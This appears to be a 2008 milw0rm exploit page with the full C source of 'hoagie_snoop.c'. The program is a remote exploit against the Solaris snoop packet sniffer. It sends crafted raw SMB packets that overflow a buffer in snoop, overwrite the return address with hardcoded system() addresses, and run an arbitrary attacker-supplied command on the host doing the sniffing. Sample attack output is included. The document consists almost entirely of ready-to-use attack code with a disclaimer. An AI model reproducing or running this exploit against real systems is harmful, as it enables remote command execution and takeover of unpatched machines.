<html><head><title>Sun Solaris <= 10 snoop(1M) Utility Remote Exploit</title></head><pre>/***********************************************************
 * hoagie_snoop.c
 * SUN SOLARIS SNOOP REMOTE EXPLOIT
 * + Sun Solaris 8/9/10
 * + OpenSolaris &lt; snv_96
 *
 * Bug discovered by Gael Delalleau
 * http://www.securityfocus.com/bid/30556
 *
 * attack:/exploits# ./hoagie_snoop -t 192.168.0.1
 * hoagie_snoop.c - solaris snoop remote
 * -andi / void.at
 *
 * [*] attacking 'SunOS opensolaris 5.11 snv_86 i86pc i386 i86pc' on '192.168.0.1' ...
 * [*] execute 'uname -a &gt; /tmp/.patch.your.system.txt' now ...
 * [*] done
 * attack:/exploits#
 *
 * admin@opensolaris:~# snoop port 445
 * Using device pcn0 (promiscuous mode)
 * sh[1]: ï¿œSMBr: not found [No such file or directory]
 * WARNING: received signal 11 from packet 1
 * ^Cadmin@opensolaris:~# cat /tmp/.patch.your.system.txt
 * SunOS opensolaris 5.11 snv_86 i86pc i386 i86pc Solaris 
 * admin@opensolaris:~#
 *
 * !!!UND IMMER DEINE FREUNDE, IHR NEHMT DOCH ALLE DROGEN!!!
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
 * DAMAGE DONE USING THIS PROGRAM.
 *
 * VOID.AT Security
 * andi@void.at
 * http://www.void.at
 *
 ************************************************************/
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;netdb.h&gt;
#include &lt;time.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;

#define MAX_PACKET		4096
#define SMB_COMMAND_TRIGGER	0x72
#define SMB_PORT_DEFAULT	445
#define SMB_TARGET_DEFAULT	&quot;127.0.0.1&quot;
#define	SMB_HEADER_FILLER	0x20

struct target_t {
   char *description;
   int  address;
} targets [] = {
   {
      /* -r-xr-xr-x 1 root bin 580460 2008-04-27 03:51 /usr/sbin/snoop */
      &quot;SunOS 5.11 snv_86 i86pc i386&quot;,
      /* system() address */
      0xd2adc2a0
   },

   {
      /* -r-xr-xr-x   1 root     bin       529956 Nov 13  2006 /usr/sbin/snoop */
      &quot;SunOS 5.10 Generic_118833-33 sun4u sparc&quot;,
      /* system() address */
      0xff1a7c00
   },

   {
      NULL,
      0,
   }
};

/* usage
 * display help screen
 */
void usage(int argc, char **argv) {
   int i;

   printf(&quot;usage: %s [-i &lt;id&gt;] [-t &lt;host&gt;] [-c &lt;command&gt;]\n&quot;
          &quot;\n&quot;
	  &quot;-i        id for target\n&quot;
          &quot;-t        host running snoop\n&quot;
	  &quot;-c        command to execute\n&quot;
          &quot;\n\n&quot;
	  &quot;available ids:\n&quot;
          ,
          argv[0]);
   for (i = 0; targets[i].description != NULL; i++) {
      printf(&quot;%2d : %s\n&quot;, i, targets[i].description);
   }
   exit(1);           
}

/* create_smb_packet
 */
void send_smb_packet(int s,
                     struct sockaddr_in *sin,
                     char smbcommand,
		     char *content) {

   char *packet = (char*)malloc(MAX_PACKET);
   int length = 0;
   struct tcphdr *tcp;
   char *data;
   int r;

   if (packet) {
      memset(packet, 0, MAX_PACKET);

      tcp = (struct tcphdr*)packet;
      tcp-&gt;source = sin-&gt;sin_port;
      tcp-&gt;dest = sin-&gt;sin_port;
      tcp-&gt;doff = sizeof(struct tcphdr) / 4;
      tcp-&gt;ack = 1;
      tcp-&gt;psh = 1;
      tcp-&gt;window = htons(32768);

      data = packet + sizeof(struct tcphdr);

      length = 4;

      strcpy(data + length, &quot;\xffSMB&quot;);
      length += 4;

      /* smb command */
      data[length++] = smbcommand;

      /* status */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* flags */
      data[length++] = 0x18;

      /* flags2 */
      data[length++] = 0x80;
      data[length++] = 0x01;

      /* extra field */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* tid */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* client process id */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* uid */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* mid */
      data[length++] = SMB_HEADER_FILLER;
      data[length++] = SMB_HEADER_FILLER;

      /* word count */
      data[length++] = SMB_HEADER_FILLER;

      /* byte count */
      data[length++] = strlen(content) &amp; 0xff;
      data[length++] = (strlen(content) &gt;&gt; 8) &amp; 0xff;

      data[length++] = 0x02;

      if (content) {
         /* content */
         strcpy(data + length, content);
         length += strlen(content);
      }
      data[length++] = 0x00;

      /* set length for smb data */
      data[3] = (length - 4) &amp; 0xff;
      data[2] = ((length - 4) &gt;&gt; 8) &amp; 0xff;

      /* send packet */
      r = sendto(s, packet, sizeof(struct tcphdr) + length, 0,
                 (struct sockaddr*)sin, sizeof(struct sockaddr_in));
   }

}

/* main entry
 */
int main(int argc, char **argv) {
   char c;
   char *target = SMB_TARGET_DEFAULT;
   int port = SMB_PORT_DEFAULT;
   int s = 0;
   struct sockaddr_in sin;
   int i = 0;
   char buffer[1024];
   int idx = 0;
   char *command = NULL;

   printf(&quot;hoagie_snoop.c - solaris snoop remote\n&quot;
          &quot;-andi / void.at\n\n&quot;);

   if (argc &lt; 2) {
      usage(argc, argv);
   } else {
      while ((c = getopt (argc, argv, &quot;hvt:p:r:i:c:&quot;)) != EOF) {
         switch (c) {
            case 't':
                 target = optarg;
                 break;
            case 'p':
                 port = atoi(optarg);
                 break;
            case 'i':
                 idx = atoi(optarg);
                 break;
            case 'c':
	         command = optarg;
		 break;
            default:
                 printf(&quot;[*] unknown command line option '%c'\n&quot;, c);
                 exit(-1);
         }
      }
   }

   s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
   if (s == -1) {
      printf(&quot;[*] failed to create raw socket\n&quot;);
   } else {
      sin.sin_family = AF_INET;
      sin.sin_port = htons(port);
      sin.sin_addr.s_addr = inet_addr(target);
   
      if (!command) {
         command = &quot;uname -a &gt; /tmp/.patch.your.system.txt&quot;;
      }
   
      printf(&quot;[*] attacking '%s' on '%s' ...\n&quot;, targets[idx].description, target);
   
      snprintf(buffer, sizeof(buffer), &quot;;%s;&quot;, command);
    
      /* char dialect[256] */
      for (i = strlen(buffer); i &lt; 256; i++) { buffer[i] = SMB_HEADER_FILLER; }
   
      /* int bytecount */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* int length */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* dummy address */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* framepointer / ebp */
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
      buffer[i++] = SMB_HEADER_FILLER;
   
      /* return address */
      buffer[i++] = targets[idx].address &amp; 0xff;
      buffer[i++] = (targets[idx].address &gt;&gt; 8) &amp; 0xff;
      buffer[i++] = (targets[idx].address &gt;&gt; 16) &amp; 0xff;
      buffer[i++] = (targets[idx].address &gt;&gt; 24) &amp; 0xff;
   
      printf(&quot;[*] execute '%s' now ...\n&quot;, command);
   
      send_smb_packet(s, &amp;sin, SMB_COMMAND_TRIGGER, buffer);
   
      printf(&quot;[*] done\n&quot;);
      	  
      close(s);
   }

   return 0;
}

// milw0rm.com [2008-08-29]</pre></html>